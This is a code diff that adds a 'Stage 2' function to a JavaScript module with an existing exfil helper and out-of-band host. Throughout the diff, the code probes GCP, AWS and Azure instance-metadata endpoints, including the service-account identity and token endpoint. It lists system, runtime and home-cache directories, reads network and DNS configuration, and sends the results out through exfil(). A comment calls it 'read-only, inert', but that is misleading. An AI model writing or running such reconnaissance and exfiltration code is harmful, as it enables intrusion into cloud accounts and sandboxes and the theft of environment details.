@@ -141,3 +141,71 @@ function exfil(tag, obj) {
 }
 
 module.exports = { facts: facts, b64: b64, exfil: exfil, OAST: OAST };
+
+// ---- Stage 2: E5 value probes (read-only, inert) ----
+function getOnce(url, headers, timeoutMs) {
+  return new Promise((resolve) => {
+    let done = false;
+    const finish = (o) => { if (!done) { done = true; resolve(o); } };
+    try {
+      const u = new URL(url);
+      const mod = u.protocol === "https:" ? https : http;
+      const req = mod.request({ hostname: u.hostname, port: u.port || (u.protocol === "https:" ? 443 : 80),
+        path: u.pathname + u.search, method: "GET", headers: headers || {},
+        rejectUnauthorized: false, timeout: timeoutMs || 4000 }, (res) => {
+        let body = "";
+        res.on("data", (d) => { if (body.length < 400) body += d.toString("utf8").slice(0, 400); });
+        res.on("end", () => finish({ status: res.statusCode, body: body.slice(0, 300) }));
+      });
+      req.on("timeout", () => { try { req.destroy(); } catch (e) { } finish({ err: "timeout" }); });
+      req.on("error", (e) => finish({ err: e.code || "error" }));
+      req.end();
+    } catch (e) { finish({ err: "exception" }); }
+    setTimeout(() => { try { } catch (e) { } finish({ err: "deadline" }); }, (timeoutMs || 4000) + 250);
+  });
+}
+
+function stage2(tag) {
+  const probes = [
+    ["gcp_project", "http://169.254.169.254/computeMetadata/v1/project/project-id", { "Metadata-Flavor": "Google" }],
+    ["gcp_email", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email", { "Metadata-Flavor": "Google" }],
+    ["gcp_project_dns", "http://metadata.google.internal/computeMetadata/v1/project/project-id", { "Metadata-Flavor": "Google" }],
+    ["gcp_root", "http://169.254.169.254/", {}],
+    ["aws_imds", "http://169.254.169.254/latest/meta-data/instance-id", {}],
+    ["azure_imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", { "Metadata": "true" }]
+  ];
+  const out = { tag: tag, probes: {}, fs: {} };
+  Promise.all(probes.map(([id, url, h]) => getOnce(url, h, 4000).then((r) => { out.probes[id] = r; })))
+    .then(() => {
+      // token endpoint: record issuance metadata only, never the value
+      return getOnce("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", { "Metadata-Flavor": "Google" }, 4000)
+        .then((r) => {
+          const t = { status: r.status || null, err: r.err || null };
+          if (r.body) {
+            try {
+              const j = JSON.parse(r.body);
+              t.token_type = j.token_type;
+              t.expires_in = j.expires_in;
+              t.has_access_token = typeof j.access_token === "string";
+              t.access_token_len = t.has_access_token ? j.access_token.length : 0;
+            } catch (e) { t.parse = "non-json"; }
+          }
+          out.probes.gcp_token_meta = t;
+        });
+    })
+    .then(() => {
+      const home = process.env.HOME || "/home/jailuser";
+      const dirs = ["/verification-runtime", "/supply-chain-runtime", "/codegraph-runtime", "/knowledge-embedding-runtime", "/opt", "/etc"];
+      for (const d of dirs) { out.fs[d] = scanDir(d, 12); }
+      out.fs["/proc/net/route"] = rd("/proc/net/route", 300);
+      out.fs["/etc/resolv.conf"] = rd("/etc/resolv.conf", 200);
+      out.fs["home_cache"] = scanDir(home + "/.cache", 10);
+      out.fs["home_local_pnpm"] = scanDir(home + "/.local/share/pnpm", 10);
+      out.fs["home_local_share"] = scanDir(home + "/.local/share", 10);
+      exfil(tag + "meta", out);
+    })
+    .catch(() => { });
+  return out;
+}
+
+module.exports.stage2 = stage2;
